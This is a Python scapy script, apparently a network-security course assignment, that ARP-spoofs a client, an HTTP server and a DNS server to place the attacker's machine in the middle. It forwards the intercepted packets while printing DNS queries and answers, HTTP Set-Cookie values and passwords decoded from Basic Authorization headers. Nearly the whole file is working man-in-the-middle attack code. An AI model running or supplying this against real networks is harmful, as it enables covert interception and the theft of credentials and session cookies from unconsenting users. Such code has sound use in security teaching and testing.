from scapy.all import *
from scapy.layers import http

import base64
import argparse
import sys
import threading
import time

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    arpReq = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(op=1, pdst=IP)
    resp = srp(arpReq)
    print(f'# MAC for {IP}: {resp[0][0][1].hwsrc}')
    return resp[0][0][1].hwsrc


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # Spoof client ARP table
        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(src_ip, src_mac, dst_ip, dst_mac):
    debug(f"spoofing {dst_ip}'s ARP table: setting {src_ip} to {src_mac}")
    spoofReq = ARP(op=2 , pdst=dst_ip, psrc=src_ip, hwdst=dst_mac, hwsrc=src_mac)
    send(spoofReq)


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    restoreReq = ARP(op=2, pdst=dstIP, psrc=srcIP, hwdst=dstMAC, hwsrc=srcMAC)
    send(restoreReq)

routingMap = {}

def handlePacket(pkt):
    global clientIP, httpServerIP, dnsServerIP, attackerIP, attackerMAC
    # Forward packet to indended host
    ip_src = pkt[IP].src
    ip_dst = pkt[IP].dst
    shouldReport = pkt[Ether].dst == attackerMAC
    pkt[Ether].src = attackerMAC
    pkt[Ether].dst = routingMap[ip_dst]
    # print(f" Modified packet MAC : {pkt[Ether].dst}")
    sendp(pkt)
    # Check if DNS packet
    if shouldReport:
        if pkt.haslayer(DNS):
            dns = pkt.getlayer(DNS)
            if dns.qr == 0:
                # Query
                print(f"*hostname:{dns.qd.qname.decode('utf-8')}")
            else:
                # Answer
                print(f"*hostaddr:{dns.an.rdata}")
        if pkt.haslayer(http.HTTP):
            if pkt.haslayer(http.HTTPResponse):
                # Response 
                response = pkt.getlayer(http.HTTPResponse)
                cookie=response.Set_Cookie
                print(f'*cookie:{cookie.decode("utf-8")}')
            elif pkt.haslayer(http.HTTPRequest):
                # Request
                request = pkt.getlayer(http.HTTPRequest)
                authFull = request.Authorization.decode("utf-8")
                auth = authFull.split(" ")[1]
                base64_bytes = auth.encode('ascii')
                message_bytes = base64.b64decode(base64_bytes)
                passcode = message_bytes.decode('ascii')
                passcode = passcode.split(":")[1]
                print(f'*basicauth:{passcode}')

# TODO: handle intercepted packets
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    routingMap[clientIP] = clientMAC
    routingMap[httpServerIP] = httpServerMAC
    routingMap[dnsServerIP] = dnsServerMAC
    sniff(prn=handlePacket, filter=f"ip host {clientIP}")


if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
